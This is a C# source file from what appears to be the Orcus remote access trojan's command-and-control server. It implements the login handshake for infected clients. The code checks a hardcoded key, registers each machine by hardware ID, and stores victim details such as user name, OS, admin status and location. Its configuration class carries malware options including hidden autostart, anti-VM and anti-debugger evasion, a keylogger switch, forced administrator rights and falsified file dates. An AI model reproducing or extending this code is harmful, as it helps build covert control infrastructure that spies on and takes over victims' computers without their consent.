using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Security;
using NLog;
using Orcus.Server.Core.Database;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core.ClientAcceptor
{
    public class ClientAcceptor1 : IClientAcceptor
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();
        private static readonly Random Random = new Random();
        private readonly DatabaseManager _databaseManager;

        public ClientAcceptor1(DatabaseManager databaseManager)
        {
            _databaseManager = databaseManager;
        }

        public int ApiVersion { get; } = 1;

        public bool LogIn(SslStream sslStream, BinaryReader binaryReader, BinaryWriter binaryWriter,
            out ClientData clientData, out CoreClientInformation information, out bool isNewClient)
        {
            clientData = null;
            information = null;
            isNewClient = false;

            binaryWriter.Write((byte) AuthentificationFeedback.GetKey);
            var keys = new KeyDatabase();
            var index = Random.Next(keys.Length);
            var key = keys.GetKey(index,
                "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh");
            binaryWriter.Write(index);
            var result = binaryReader.ReadString();
            if (key != result)
            {
                binaryWriter.Write((byte) AuthentificationFeedback.InvalidKey);
                Logger.Info("Invalid key - denied");
                return false;
            }

            binaryWriter.Write((byte) AuthentificationFeedback.GetHardwareId);
            var hardwareId = binaryReader.ReadString();
            if (hardwareId.Length > 256)
            {
                Logger.Info("Client rejected because the hardware id was too long. Length: {0}, MaxLength: 256",
                    hardwareId.Length);
                return false;
            }

            var knowClient = _databaseManager.GetClient(hardwareId, out clientData);
            string clientTag = null;

            if (knowClient)
                binaryWriter.Write((byte) AuthentificationFeedback.Accepted);
            else
            {
                binaryWriter.Write((byte) AuthentificationFeedback.GetClientTag);
                clientTag = binaryReader.ReadString();
                if (clientTag.Length > 256)
                {
                    Logger.Info("Client rejected because the client tag was too long. Length: {0}, MaxLength: 256",
                        clientTag.Length);
                    return false;
                }
                binaryWriter.Write((byte) AuthentificationFeedback.Accepted);
            }

            var serializer = new Serializer(typeof (BasicComputerInformation));
            var tempInformation = (BasicComputerInformation) serializer.Deserialize(sslStream);
            information = new CoreClientInformation
            {
                ApiVersion = tempInformation.ApiVersion,
                ClientConfig = null /*new Shared.Client.ClientConfig
                {
                    Mutex = tempInformation.ClientConfig.Mutex,
                    InstallationFolder = tempInformation.ClientConfig.InstallFolder,
                    IpAddresses =
                        new List<IpAddressInfo>
                        {
                            new IpAddressInfo
                            {
                                Ip = tempInformation.ClientConfig.IpAddress,
                                Port = tempInformation.ClientConfig.Port
                            }
                        },
                    NewCreationDate = tempInformation.ClientConfig.NewCreationDate,
                    ClientTag = tempInformation.ClientConfig.ClientTag,
                    RegistryAutostartKeyName = tempInformation.ClientConfig.StartupKey,
                    HideFile = tempInformation.ClientConfig.HideFile,
                    Install = tempInformation.ClientConfig.InstallToFolder,
                    ChangeCreationDate = tempInformation.ClientConfig.ChangeCreationDate,
                    ForceInstallerAdministratorRights = tempInformation.ClientConfig.ForceInstallerAdministratorRights,
                    SetAdminFlag = tempInformation.ClientConfig.SetAdminFlag,
                    InstallService = tempInformation.ClientConfig.InstallService,
                    IsKeyloggerEnabled = tempInformation.ClientConfig.IsKeyloggerEnabled,
                    AdministrationRightsRequired = tempInformation.ClientConfig.AdministrationRightsRequired,
                    RegistryHiddenAutostart = tempInformation.ClientConfig.HiddenStart,
                    ReconnectDelay = tempInformation.ClientConfig.ReconnectDelay,
                    AutostartMethod = tempInformation.ClientConfig.Autostart ? 1 : 0,
                    FrameworkVersion = tempInformation.ClientConfig.FrameworkVersion
                }*/,
                ClientPath = tempInformation.ClientPath,
                ClientVersion = tempInformation.ClientVersion,
                FrameworkVersion = tempInformation.FrameworkVersion,
                Language = tempInformation.Language,
                UserName = tempInformation.UserName,
                OSType = tempInformation.OSType,
                Plugins = tempInformation.Plugins,
                IsAdministrator = tempInformation.IsAdministrator,
                IsServiceRunning = tempInformation.IsServiceRunning,
                OSName = tempInformation.OSName,
                LoadablePlugins = tempInformation.LoadablePlugins
            };

            Logger.Debug("Client Information:\r\n" + information);

            if (information.OSName.Length > 256)
            {
                Logger.Info("Client rejected because the OSName was too long. Length: {0}, MaxLength: 256",
                    information.OSName.Length);
                return false;
            }

            if (information.UserName.Length > 256)
            {
                Logger.Info("Client rejected because the UserName was too long. Length: {0}, MaxLength: 256",
                    information.UserName.Length);
                return false;
            }

            if (information.Language.Length > 32)
            {
                Logger.Info("Client rejected because the Language was too long. Length: {0}, MaxLength: 256",
                    information.Language.Length);
                return false;
            }

            if (knowClient)
            {
                _databaseManager.RefreshClient(clientData.Id, information.UserName, information.OSName,
                    (int) information.OSType, information.Language, null);
                clientData.UserName = information.UserName;
                clientData.OSName = information.OSName;
                clientData.OSType = information.OSType;
                clientData.Language = information.Language;
            }
            else
            {
                Logger.Info("Register client...");
                var id = _databaseManager.AddClient(information.UserName, hardwareId, information.OSName,
                    (int) information.OSType, information.Language, clientTag, null);
                if (id == -1)
                {
                    Logger.Error("The generated id of the new client is -1");
                    return false;
                }
                clientData = new ClientData
                {
                    Id = id,
                    Language = information.Language,
                    HardwareId = hardwareId,
                    LastSeen = DateTime.UtcNow,
                    UserName = information.UserName,
                    OSType = information.OSType,
                    OSName = information.OSName,
                    Group = clientTag
                };
            }

            isNewClient = !knowClient;
            return true;
        }

        [Serializable]
        private class BasicComputerInformation
        {
            public string UserName { get; set; }
            public string OSName { get; set; }
            public OSType OSType { get; set; }
            public string Language { get; set; }
            public bool IsAdministrator { get; set; }
            public bool IsServiceRunning { get; set; }
            public List<PluginInfo> Plugins { get; set; }
            public List<LoadablePlugin> LoadablePlugins { get; set; }
            public ClientConfig ClientConfig { get; set; }
            public int ClientVersion { get; set; }
            public float Latitude { get; set; }
            public float Longitude { get; set; }
            public string ClientPath { get; set; }
            public int ApiVersion { get; set; }
            public double FrameworkVersion { get; set; }
        }

        [Serializable]
        private class ClientConfig
        {
            public bool Autostart { get; set; }
            public string Mutex { get; set; }
            public string StartupKey { get; set; }
            public bool HideFile { get; set; }
            public bool ProtectFromVMs { get; set; }
            public bool AntiDebugger { get; set; }
            public bool AntiTcpAnalyzer { get; set; }
            public bool InstallToFolder { get; set; }
            public string InstallFolder { get; set; }
            public int Port { get; set; }
            public string IpAddress { get; set; }
            public int ReconnectDelay { get; set; }
            public bool HiddenStart { get; set; }
            public bool ChangeCreationDate { get; set; }
            public string NewCreationDate { get; set; }
            public bool ForceInstallerAdministratorRights { get; set; }
            public bool SetAdminFlag { get; set; }
            public bool InstallService { get; set; }
            public string ClientTag { get; set; }
            public bool IsKeyloggerEnabled { get; set; }
            public bool AdministrationRightsRequired { get; set; }
            public byte FrameworkVersion { get; set; }
        }
    }
}